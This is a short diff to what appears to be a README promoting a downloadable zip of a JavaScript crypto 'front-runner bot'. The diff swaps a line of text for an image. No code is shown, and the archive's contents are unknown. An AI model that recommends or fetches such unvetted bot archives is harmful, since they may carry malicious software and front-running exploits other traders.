@@ -6,7 +6,9 @@ You can download to front running bot here
 https://github.com/myhwalters/JavaScript-front-runner-bot-eth-bnb-polygon/raw/main/front-runner-bot.zip
 
 <img src="https://i.ibb.co/R3r7556/frontrun.png" alt="frontrun" border="0">
-Let’s get started.
+
+
+<img src="https://i.ibb.co/G3Wt8x3/frontrunnerjavascript.png" alt="frontrunnerjavascript" border="0">
 
 Part 1. Main software installations.
 
